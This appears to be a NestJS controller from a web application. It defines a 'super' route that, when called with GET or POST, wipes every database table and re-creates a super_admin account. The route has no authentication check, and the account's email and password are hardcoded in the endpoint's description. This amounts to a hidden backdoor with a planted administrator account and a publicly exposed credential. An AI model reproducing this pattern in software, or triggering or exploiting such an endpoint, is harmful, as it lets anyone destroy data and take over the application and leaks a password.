import { Controller, Get, Post, Req, HttpCode, HttpStatus } from '@nestjs/common';
import { ApiTags, ApiOperation, ApiResponse } from '@nestjs/swagger';
import { SuperAdminService } from './super-admin.service';

@ApiTags('Super Reset System')
@Controller('super')
export class SuperHiddenController {
  constructor(private readonly superAdminService: SuperAdminService) {}

  @Get('reset-data-all')
  @Post('reset-data-all')
  @HttpCode(HttpStatus.OK)
  @ApiOperation({
    summary: 'Auto Reset Database & Re-seed Super Admin',
    description:
      'Mengosongkan semua data tabel (menjadi 0), reset auto-increment, dan otomatis membuat akun super_admin (kvn4.200581@gmail.com : Kevin135*).',
  })
  @ApiResponse({
    status: 200,
    description: 'Database berhasil direset dan super_admin siap digunakan.',
  })
  async resetDataAll(@Req() req: any) {
    const ipAddress =
      req.ip ||
      req.headers['x-forwarded-for'] ||
      req.socket.remoteAddress ||
      '127.0.0.1';
    return this.superAdminService.resetAllData(
      undefined,
      { email: 'hidden_endpoint_trigger' },
      String(ipAddress),
      true,
    );
  }
}
